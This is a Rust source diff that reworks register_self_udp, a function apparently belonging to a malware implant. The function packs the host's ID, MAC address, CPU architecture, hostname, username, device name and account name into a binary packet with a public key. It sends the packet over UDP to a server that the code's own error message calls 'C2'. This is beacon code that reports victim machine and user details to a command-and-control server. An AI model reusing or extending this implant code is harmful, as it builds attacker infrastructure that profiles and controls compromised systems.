@@ -10,7 +10,7 @@ use crate::{
 use hickory_resolver::Resolver;
 use std::net::Ipv4Addr;
 use tokio::net::UdpSocket;
-use tokio::time::{timeout, Duration};
+use tokio::time::{Duration, timeout};
 
 mod errors;
 mod types;
@@ -54,33 +54,47 @@ async fn register_self_udp(
         .map_err(|err| RegistrationError::Connection(err))?;
 
     let mut reg_buf: Vec<u8> = Vec::new();
-    
+    reg_buf.extend_from_slice(&[77, 33, 1]);
+
     let write_string = |buf: &mut Vec<u8>, s: &str| {
         let bytes = s.as_bytes();
         let len = bytes.len() as u16;
         buf.extend_from_slice(&len.to_be_bytes());
         buf.extend_from_slice(bytes);
     };
-    
-    let write_optional_string = |buf: &mut Vec<u8>, opt: &Option<String>| {
-        match opt {
-            Some(s) => write_string(buf, s),
-            None => buf.extend_from_slice(&0u16.to_be_bytes()),
-        }
+
+    let write_optional_string = |buf: &mut Vec<u8>, opt: &Option<String>| match opt {
+        Some(s) => write_string(buf, s),
+        None => buf.extend_from_slice(&0u16.to_be_bytes()),
     };
+
+    reg_buf.extend_from_slice(&base85::decode(&identity.nodus_id).unwrap());
     
-    write_string(&mut reg_buf, &identity.nodus_id);
-    write_string(&mut reg_buf, &identity.cpu_arch);
-    write_optional_string(&mut reg_buf, &identity.hostname);
-    write_optional_string(&mut reg_buf, &identity.username);
-    write_optional_string(&mut reg_buf, &identity.account_name);
-    write_optional_string(&mut reg_buf, &identity.device_name);
-    write_optional_string(&mut reg_buf, &identity.mac_addr);
-    
+    // Write MAC address as 6 raw bytes
+    if let Some(m) = &identity.mac_addr {
+        let mac_bytes: Vec<u8> = m.split(':')
+            .filter_map(|hex| u8::from_str_radix(hex, 16).ok())
+            .collect();
+        if mac_bytes.len() == 6 {
+            reg_buf.extend_from_slice(&mac_bytes);
+        } else {
+            reg_buf.extend_from_slice(&[0, 0, 0, 0, 0, 0]);
+        }
+    } else {
+        reg_buf.extend_from_slice(&[0, 0, 0, 0, 0, 0]);
+    }
+
+    reg_buf.extend_from_slice(&[1]);
     let public_key = identity.asym_sec.get_public_key();
     let public_key_len = public_key.len() as u16;
     reg_buf.extend_from_slice(&public_key_len.to_be_bytes());
     reg_buf.extend_from_slice(&public_key);
+
+    write_string(&mut reg_buf, &identity.cpu_arch);
+    write_optional_string(&mut reg_buf, &identity.hostname);
+    write_optional_string(&mut reg_buf, &identity.username);
+    write_optional_string(&mut reg_buf, &identity.device_name);
+    write_optional_string(&mut reg_buf, &identity.account_name);
 
     timeout(Duration::from_secs(10), sock.send(&reg_buf))
         .await
@@ -92,13 +106,15 @@ async fn register_self_udp(
         .await
         .map_err(|_| RegistrationError::Timeout("Timed out waiting for registration ack".into()))?
         .map_err(|err| RegistrationError::Communication(err))?;
-    
+
     if bytes_received == 0 {
         return Err(RegistrationError::ServerSilence);
     }
 
     if bytes_received < 3 || &ack_buf[..3] != b"ACK" {
-        return Err(RegistrationError::Unknown("Invalid acknowledgement from C2".into()));
+        return Err(RegistrationError::Unknown(
+            "Invalid acknowledgement from C2".into(),
+        ));
     }
 
     Ok(())
